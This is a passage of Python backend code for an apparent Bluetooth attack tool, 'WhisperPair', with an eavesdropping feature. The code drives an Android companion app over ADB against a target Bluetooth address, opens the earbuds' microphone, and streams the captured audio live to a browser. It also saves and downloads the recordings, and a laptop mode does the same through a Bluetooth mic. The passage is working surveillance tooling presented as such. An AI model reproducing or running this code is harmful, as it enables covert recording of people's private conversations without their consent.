            ["pw-record", "--channels=1", "--rate=8000", "--format=s16", local_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        eavesdrop_proc = rec_proc

        # Stream raw PCM to browser via pw-cat
        stream_proc = subprocess.Popen(
            ["pw-cat", "--record", "--channels=1", "--rate=8000", "--format=s16"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        start_time = time.time()

        try:
            while rec_proc.poll() is None:
                chunk = stream_proc.stdout.read(4096)
                if not chunk:
                    break

                socketio.emit("eavesdrop:audio", {
                    "pcm": base64.b64encode(chunk).decode("ascii"),
                    "rate": 8000,
                    "channels": 1,
                    "bits": 16,
                })

                # VU meter
                elapsed = int(time.time() - start_time)
                ts = f"{elapsed // 60:02d}:{elapsed % 60:02d}"
                max_amp = 0
                for i in range(0, len(chunk) - 1, 2):
                    s = abs(int.from_bytes(chunk[i:i+2], 'little', signed=True))
                    if s > max_amp:
                        max_amp = s
                bars = min(max_amp // 500, 20)
                vu = "\u2588" * bars + "\u2591" * (20 - bars)
                socketio.emit("eavesdrop:status", {
                    "stage": "recording",
                    "message": f"{ts} {vu} {max_amp}",
                    "status": "running",
                })
        finally:
            if stream_proc.poll() is None:
                stream_proc.terminate()
            if rec_proc.poll() is None:
                rec_proc.terminate()
                rec_proc.wait(timeout=5)
            eavesdrop_proc = None

        if os.path.exists(local_path):
            size = os.path.getsize(local_path)
            last_eavesdrop_file = local_path
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": f"Recording saved — {size // 1024}KB captured from BT mic.",
                "status": "success",
                "download_url": "/api/eavesdrop/download",
            })
        else:
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": "Eavesdrop stopped.",
                "status": "warning",
            })

    thread = threading.Thread(target=run_laptop_eavesdrop, daemon=True)
    thread.start()


def handle_eavesdrop_phone(data):
    global last_eavesdrop_file, eavesdrop_logcat

    device_id = data.get("device_id") or selected_adb_device
    address = data.get("address")

    if not device_id:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No ADB phone connected", "status": "error"})
        return
    if not address:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
        return

    def run_live_eavesdrop():
        global last_eavesdrop_file, eavesdrop_logcat

        subprocess.run(["adb", "-s", device_id, "logcat", "-c"],
                       capture_output=True, text=True, timeout=5)

        socketio.emit("eavesdrop:status", {
            "stage": "launching",
            "message": f"Opening live eavesdrop on {address}...",
            "status": "running",
        })

        # Launch eavesdrop activity
        result = subprocess.run(
            ["adb", "-s", device_id, "shell", "am", "start",
             "-a", "com.whisperpair.EAVESDROP",
             "--es", "address", address],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            socketio.emit("eavesdrop:status", {
                "stage": "error",
                "message": f"Failed to launch: {result.stderr.strip()}",
                "status": "error",
            })
            return

        # Set up ADB port forwarding for audio stream
        subprocess.run(
            ["adb", "-s", device_id, "forward", "tcp:19876", "tcp:19876"],
            capture_output=True, text=True, timeout=5,
        )

        # Start logcat monitor
        eavesdrop_stopping.clear()
        logcat_proc = subprocess.Popen(
            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        eavesdrop_logcat = logcat_proc

        # Start audio stream reader in separate thread
        audio_thread = threading.Thread(target=stream_audio_to_browser, daemon=True)
        audio_thread.start()

        try:
            while logcat_proc.poll() is None and not eavesdrop_stopping.is_set():
                ready, _, _ = select.select([logcat_proc.stdout], [], [], 1.0)
                if not ready:
                    continue
                line = logcat_proc.stdout.readline().strip()
                if not line:
                    continue
                msg = line.split(":", 1)[-1].strip() if ":" in line else line

                if "EAVESDROP_VU" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": msg.replace("EAVESDROP_VU ", ""),
                        "status": "running",
                    })
                elif "EAVESDROP_LIVE_STARTED" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": "LIVE — streaming earbuds mic to browser",
                        "status": "running",
                    })
                elif "EAVESDROP_STOPPED" in msg:
                    break
                elif "SCO connected" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "recording",
                        "message": "SCO connected — mic active!",
                        "status": "running",
                    })
                elif "ERROR" in msg:
                    socketio.emit("eavesdrop:status", {
                        "stage": "error", "message": msg, "status": "error",
                    })
        finally:
            if logcat_proc.poll() is None:
                logcat_proc.terminate()
                logcat_proc.wait(timeout=5)
            eavesdrop_logcat = None

    thread = threading.Thread(target=run_live_eavesdrop, daemon=True)
    thread.start()


def stream_audio_to_browser():
    """Connect to the Android app's TCP audio stream and forward
    raw PCM chunks to the browser via Socket.IO."""
    time.sleep(3)  # Wait for the app to start the server

    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", 19876))
        s.settimeout(1)
    except Exception as e:
        socketio.emit("eavesdrop:status", {
            "stage": "recording",
            "message": f"Audio stream: could not connect ({e})",
            "status": "warning",
        })
        return

    socketio.emit("eavesdrop:status", {
        "stage": "recording",
        "message": "Audio stream connected — playing in browser",
        "status": "running",
    })

    try:
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                # Send raw PCM as base64 to browser
                socketio.emit("eavesdrop:audio", {
                    "pcm": base64.b64encode(data).decode("ascii"),
                    "rate": 8000,
                    "channels": 1,
                    "bits": 16,
                })
            except sock.timeout:
                continue
            except Exception:
                break
    finally:
        s.close()


eavesdrop_stopping = threading.Event()


@socketio.on("eavesdrop:stop")
def handle_eavesdrop_stop():
    global eavesdrop_logcat, eavesdrop_proc
    device_id = selected_adb_device

    # Signal the logcat thread to stop
    eavesdrop_stopping.set()

    # Stop laptop mode recording if active
    if eavesdrop_proc and eavesdrop_proc.poll() is None:
        eavesdrop_proc.terminate()
        eavesdrop_proc = None

    socketio.emit("eavesdrop:status", {
        "stage": "stopping",
        "message": "Stopping eavesdrop...",
        "status": "running",
    })

    if device_id:
        # Send stop broadcast to the app
        subprocess.run(
            ["adb", "-s", device_id, "shell", "am", "broadcast",
             "-a", "com.whisperpair.STOP_EAVESDROP"],
            capture_output=True, text=True, timeout=5,
        )

        # Kill logcat monitor
        if eavesdrop_logcat and eavesdrop_logcat.poll() is None:
            eavesdrop_logcat.terminate()
            eavesdrop_logcat = None

        # Remove port forward
        subprocess.run(
            ["adb", "-s", device_id, "forward", "--remove", "tcp:19876"],
            capture_output=True, text=True, timeout=5,
        )

    # Pull recording in background
    def pull_recording():
        global last_eavesdrop_file
        time.sleep(2)

        if not device_id:
            return

        recording_file = "/storage/emulated/0/Android/data/com.whisperpair.companion/files/eavesdrop_live.wav"
        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
        pull_result = subprocess.run(
            ["adb", "-s", device_id, "pull", recording_file, local_path],
            capture_output=True, text=True, timeout=15,
        )

        if pull_result.returncode == 0 and os.path.exists(local_path):
            size = os.path.getsize(local_path)
            last_eavesdrop_file = local_path
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": f"Recording saved — {size // 1024}KB captured from earbuds mic.",
                "status": "success",
                "download_url": "/api/eavesdrop/download",
            })
        else:
            socketio.emit("eavesdrop:status", {
                "stage": "complete",
                "message": "Eavesdrop stopped.",
                "status": "warning",
            })

    threading.Thread(target=pull_recording, daemon=True).start()


if __name__ == "__main__":
    print("WhisperPair Web Interface - Backend")
    print("http://localhost:5000")
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
